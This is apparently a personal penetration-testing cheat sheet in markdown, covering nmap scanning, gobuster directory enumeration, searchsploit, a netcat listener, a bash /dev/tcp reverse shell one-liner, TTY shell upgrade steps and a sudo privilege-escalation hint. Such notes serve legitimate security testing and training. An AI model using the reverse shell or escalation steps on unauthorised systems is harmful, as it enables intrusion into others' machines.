## Port scanning
### Nmap
* `nmap -sC -sV -oA <FILENAME> <IP>`
  * Default script, version detection, output to file 
  * [Explanation](https://www.cleancss.com/explain-command/nmap/4068984)


## Enumeration
### Directories
* `gobuster dir -u http://<SERVER> -o dirs.txt -w ~/links/dirlist.txt`
  * [Documentation](https://github.com/OJ/gobuster)
* [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

  
## Exploits
### Searchsploit
* Simple search - `searchsploit <KEYWORD>`
* Exploit details - `searchsploit -x <PATH>`
* Copy exploit - `searchsploit -m <PATH>`

### Websites
* [exploit-db.com](https://www.exploit-db.com/)

## Reverse shells
### Listen for connections
* `nc –nlvp <PORT>`
    * [Explanation](https://www.cleancss.com/explain-command/index.php?string=nc+-l+-v+-p)
### Bash
* `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`

### TTY shell
1. Open netcat session
1. `python -c 'import pty; pty.spawn("/bin/bash")'`
2. `export TERM=xterm`
3. `CTRL+Z`
4. `stty raw -echo`
5. `fg`

[Other methods of spawning a TTY Shell](https://netsec.ws/?p=337)

## Privilege escalation
### Sudo pwnage
* Commands executable as root - `sudo -l`
  * `(root) NOPASSWD: /usr/bin/vi /var/www/html/*`
  
[Basic cheat sheet](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

## Useful websites
* Explain linux commands - [cleancss.com/explain-command/](https://www.cleancss.com/explain-command/)
* Default router settings - [cleancss.com/router-default/](https://www.cleancss.com/router-default/)
